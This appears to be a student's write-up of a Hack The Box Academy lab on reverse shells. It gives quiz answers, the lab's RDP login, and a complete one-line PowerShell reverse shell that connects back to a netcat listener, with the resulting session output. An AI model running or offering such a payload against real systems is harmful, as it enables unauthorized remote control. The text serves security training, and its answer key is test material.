# Section 05: Reverse Shells

Module: 08. Shells & Payloads

---

## Questions & Answers

### 1. When establishing a reverse shell session with a target, will the target act as a client or server?

**Answer:** `client`

---

### 2. Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.

Context:
On Pwnbox
```bash
┌─[eu-academy-1]─[10.10.15.177]─[htb-ac-2162140@htb-oewupgk2aq]─[~]
└──╼ [★]$ sudo nc -lvnp 4444
Listening on 0.0.0.0 4444
```
RDP to Windows machine, open Command Prompt, get reverse shell:
```bash
┌─[eu-academy-1]─[10.10.15.177]─[htb-ac-2162140@htb-oewupgk2aq]─[~]
└──╼ [★]$ export KRB5_CONFIG=/dev/null
xfreerdp /v:10.129.201.51 /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution /cert:ignore +clipboard /sound:sys:pulse
```

On Windows Command Prompt
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.177',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

On Pwnbox after reverse shell:
```bash
┌─[eu-academy-1]─[10.10.15.177]─[htb-ac-2162140@htb-oewupgk2aq]─[~]
└──╼ [★]$ sudo nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.201.51 49874
id
PS C:\Users\htb-student> ls


    Directory: C:\Users\htb-student


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---       10/16/2021   9:08 AM                3D Objects                                                            
d-r---       10/16/2021   9:08 AM                Contacts                                                              
d-r---       10/16/2021  10:01 AM                Desktop                                                               
d-r---       10/16/2021   9:08 AM                Documents                                                             
d-r---       10/16/2021   9:08 AM                Downloads                                                             
d-r---       10/16/2021   9:08 AM                Favorites                                                             
d-r---       10/16/2021   9:08 AM                Links                                                                 
d-r---       10/16/2021   9:08 AM                Music                                                                 
d-r---       10/16/2021   9:09 AM                OneDrive                                                              
d-r---       10/16/2021   9:08 AM                Pictures                                                              
d-r---       10/16/2021   9:08 AM                Saved Games                                                           
d-r---       10/16/2021   9:08 AM                Searches                                                              
d-r---       10/18/2021   7:59 PM                Videos                                                                
-a----        7/27/2026   8:39 PM              0 powershell                                                            


PS C:\Users\htb-student> hostname
Shells-Win10
```

**Answer:** `Shells-Win10`

---


[Back to Module Index](./README.md)
